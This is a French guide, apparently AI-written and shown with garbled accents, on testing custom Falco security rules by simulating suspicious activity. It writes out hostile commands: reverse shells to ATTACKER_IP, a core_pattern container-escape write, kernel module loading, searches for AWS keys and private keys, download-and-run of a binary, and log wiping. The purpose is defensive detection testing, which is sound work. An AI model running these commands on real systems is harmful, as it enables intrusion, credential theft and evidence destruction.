cat file_transfert.txt 
Pour tester tes rÃ¨gles personnalisÃ©es Falco (comme Disallowed SSH Connection Non Standard Port ou Redirect STDOUT/STDIN to Network Connection in Container), tu dois simuler les comportements malveillants ou suspects que ces rÃ¨gles visent Ã  dÃ©tecter. Voici un plan prÃ©cis pour tester chaque rÃ¨gle, avec les commandes concrÃ¨tes Ã  exÃ©cuter dans un environnement contrÃ´lÃ© (lab ou VM Docker/Kubernetes) :
âœ… 1. Disallowed SSH Connection Non Standard Port

Objectif : DÃ©tecter une connexion SSH sortante vers un port non standard.
ðŸ’¥ Simulation :

ssh -p 4444 user@yourserver.com

ðŸ”§ PrÃ©requis :

    Assure-toi que 4444 est bien dans la liste ssh_non_standard_ports dans tes rÃ¨gles.

    Si besoin, tu peux lancer un serveur SSH temporaire en Ã©coute sur ce port :

sudo sshd -p 4444 -f /etc/ssh/sshd_config_test

âœ… RÃ©sultat attendu :

    Une alerte Falco avec message :
    Disallowed SSH Connection | connection=...

âœ… 2. Redirect STDOUT/STDIN to Network Connection in Container

Objectif : DÃ©tecter un shell inversÃ© dans un conteneur.
ðŸ’¥ Simulation (reverse shell vers netcat listener) :

Sur ton attacker machine (listener) :

nc -lvp 1234

Dans un conteneur cible :

bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1

Ou encore avec curl et bash :

bash -c 'exec 5<>/dev/tcp/ATTACKER_IP/1234;cat <&5 | while read line; do $line 2>&5 >&5; done'

âœ… RÃ©sultat attendu :

    Falco dÃ©tecte :
    Redirect stdout/stdin to network connection | gparent=...

âœ… 3. Linux Kernel Module Injection Detected

Objectif : DÃ©tecter lâ€™injection de modules noyau depuis un conteneur.
ðŸ’¥ Simulation (Ã  faire en VM avec module Ã  charger) :

insmod malicious.ko

Tu peux crÃ©er un module vide :

// hello.c
#include <linux/module.h>
#include <linux/kernel.h>
int init_module(void) { return 0; }
void cleanup_module(void) {}

Puis :

make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
insmod hello.ko

Depuis un conteneur privilÃ©giÃ© :

docker run --rm -it --privileged alpine sh
insmod hello.ko

âœ… 4. Debugfs Launched in Privileged Container

Objectif : DÃ©tecter lancement de debugfs dans un conteneur avec privilÃ¨ges.
ðŸ’¥ Simulation :

docker run --rm -it --privileged debian bash
apt update && apt install -y e2fsprogs
debugfs /dev/sda1

âœ… 5. Detect release_agent File Container Escapes

Objectif : DÃ©tection d'une tentative d'Ã©vasion via /proc/sys/kernel/core_pattern.
ðŸ’¥ Simulation (âš ï¸ potentiellement dangereux) :

echo "/tmp/malicious.sh" > /proc/sys/kernel/core_pattern

Ou dans un conteneur :

echo "/tmp/x" > /proc/sys/kernel/core_pattern

âœ… 6. PTRACE attached to process

Objectif : DÃ©tection dâ€™un ptrace (injection de code/debug).
ðŸ’¥ Simulation :

strace -p <PID>

Ou avec GDB :

gdb -p <PID>

âœ… 7. Find AWS Credentials

Objectif : DÃ©tection de recherche de clÃ©s AWS.
ðŸ’¥ Simulation :

grep -r "aws_secret_access_key" ~/

Ou :

find ~/.aws/ -name credentials

âœ… 8. Execution from /dev/shm

Objectif : DÃ©tecter lâ€™exÃ©cution depuis /dev/shm.
ðŸ’¥ Simulation :

cp /bin/bash /dev/shm/bash
chmod +x /dev/shm/bash
/dev/shm/bash

âœ… 9. Drop and Execute New Binary in Container

Objectif : ExÃ©cuter un binaire tÃ©lÃ©chargÃ© dans un conteneur.
ðŸ’¥ Simulation :

docker run -it ubuntu bash
curl -o /tmp/nc http://<yourserver>/nc
chmod +x /tmp/nc
/tmp/nc -h

âœ… 10. Clear Log Activities

Objectif : DÃ©tection de vidage de journaux.
ðŸ’¥ Simulation :

truncate -s 0 /var/log/auth.log

âœ… 11. Remove Bulk Data from Disk

Objectif : ExÃ©cution de commandes destructrices.
ðŸ’¥ Simulation :

shred -u /tmp/testfile

âœ… 12. Create Symlink Over Sensitive Files

Objectif : CrÃ©er un lien symbolique vers un fichier sensible.
ðŸ’¥ Simulation :

ln -s /etc/shadow /tmp/shadow_link

âœ… 13. Packet socket created in container

Objectif : CrÃ©ation de socket en mode AF_PACKET.
ðŸ’¥ Simulation :

docker run --rm -it --cap-add=NET_RAW debian bash
apt update && apt install -y tcpdump
tcpdump -i eth0

âœ… 14. Search Private Keys or Passwords

Objectif : Recherche de fichiers id_rsa, etc.
ðŸ’¥ Simulation :

find / -name "id_rsa"

ðŸ“Œ Comment vÃ©rifier les alertes Falco ?
1. Via logs Falco :

journalctl -u falco -f

2. Si tu utilises Falcosidekick :

    Check Slack / Discord / Webhook / UI selon ta config.

ðŸ“š Tips finaux :

    Tu peux aussi dÃ©clencher manuellement un log Falco en exÃ©cutant :

falco -r /etc/falco/falco_rules.yaml -r /etc/falco/custom_rules.yaml -A

